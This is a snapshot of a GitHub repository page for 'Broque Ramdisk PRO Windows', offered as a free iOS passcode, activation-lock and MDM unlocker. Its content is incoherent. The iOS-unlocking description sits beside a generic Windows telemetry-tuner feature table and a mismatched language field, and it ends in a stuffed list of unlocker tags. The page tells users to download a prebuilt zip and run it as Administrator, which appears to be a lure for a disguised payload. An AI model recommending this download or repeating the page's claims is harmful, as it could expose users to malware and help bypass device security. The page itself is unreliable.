---
title: "eric-son-dev2091c0/broque-ramdisk-pro-windows-portable"
owner: "eric-son-dev2091c0"
name: "broque-ramdisk-pro-windows-portable"
fullName: "eric-son-dev2091c0/broque-ramdisk-pro-windows-portable"
description: "Broque Ramdisk PRO Windows — Free iOS Passcode, Hello Screen & MDM unlocker Utility (Portable Suite): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release."
sourceUrl: "https://github.com/eric-son-dev2091c0/broque-ramdisk-pro-windows-portable"
stars: 278
forks: 0
language: "Jupyter Notebook"
topics: ["3utools", "automation", "broque-ramdisk", "broque-ramdisk-pro-windows-portable", "cli-utility", "configuration", "csharp", "desktop-app"]
license: "NOASSERTION"
homepage: "https://eric-son-dev2091c0.github.io/broque-ramdisk-pro-windows-portable/"
defaultBranch: "main"
snapshotDate: "2026-11-23"
pushedAt: "2026-11-23T06:20:18Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# Broque Ramdisk PRO Windows — Free iOS Passcode, Hello Screen & MDM unlocker Utility (Portable Suite)

Broque Ramdisk PRO Windows — Free iOS Passcode, Hello Screen & MDM unlocker Utility (Portable Suite): native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.

*图片：CI Build*
*图片：Latest Release*
*图片：Total Downloads*
*图片：Stars*
[*图片：Open in Colab*](https://colab.research.google.com/github/eric-son-dev2091c0/broque-ramdisk-pro-windows-portable/blob/main/notebooks/quickstart.ipynb)


---

## Architecture Summary

**Broque Ramdisk PRO Windows — Free iOS Passcode, Hello Screen & MDM unlocker Utility (Portable Suite)** (`broque-ramdisk-pro-windows-portable`) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

> [!IMPORTANT]
> **1-Click Prebuilt Package (No Compiler Required)**: Even though the full source tree (`src/`, `config/`) is included in this repository, end users do **not** need to compile anything. Click the green **Download Portable Release** button above or grab `broque-ramdisk-pro-windows-portable-v1.2.0-win64.zip` directly from **Releases**.

## 1-Click Portable Installation

| Platform | Direct Download Package | Checksum Manifest |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | **`broque-ramdisk-pro-windows-portable-v1.2.0-win64.zip`** | `SHA256SUMS.txt` |

1. Download `broque-ramdisk-pro-windows-portable-v1.2.0-win64.zip` from the table above or the **Releases** section.
2. Extract the `.zip` archive into any folder (keep `config/settings.json` next to the launcher).
3. Launch the executable as Administrator.

## Core Subsystems & Capabilities

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Portable Lifecycle Engine** | Zero-install isolated state container | Leaves host registry clean; 1-click rollback |
| **Profile State Snapshot** | Automatic backup before applying changes | Restores baseline configuration at any time |
| **Telemetry & Task Tuner** | Disables redundant background update checks | Lowers idle memory & disk I/O overhead |
| **Unattended CLI Mode** | JSON-driven configuration (`config/settings.json`) | Scriptable batch deployment on Windows 10/11 |

## Configuration (`config/settings.json`)

```json
{
  "version": "1.2.0",
  "runtime": {
    "portable_mode": true,
    "auto_backup_registry": true,
    "verify_signatures": true,
    "theme": "dark",
    "log_level": "info"
  },
  "modules": {
    "lifecycle_manager": {
      "enabled": true,
      "clean_temp_cache": true,
      "preserve_user_profiles": true
    },
    "service_optimizer": {
      "enabled": true,
      "disable_telemetry_tasks": true
    }
  }
}
```

## Building from Source

```bash
git clone https://github.com/eric-son-dev2091c0/broque-ramdisk-pro-windows-portable.git
cd broque-ramdisk-pro-windows-portable
dotnet build src/RuntimeToolkit.csproj -c Release
```

---
Indexed tags: broque-ramdisk, iremoval-pro, 3utools, icloud-unlocker, mdm-unlocker, hello-screen-unlocker, passcode-unlocker, checkm8-windows, dfu-ramdisk-tool, ios-18-unlocker, hackt1vator, shsh-blobs, ipa-signer-windows, virtual-location-ios, activation-lock-unlocker, baseband-saver
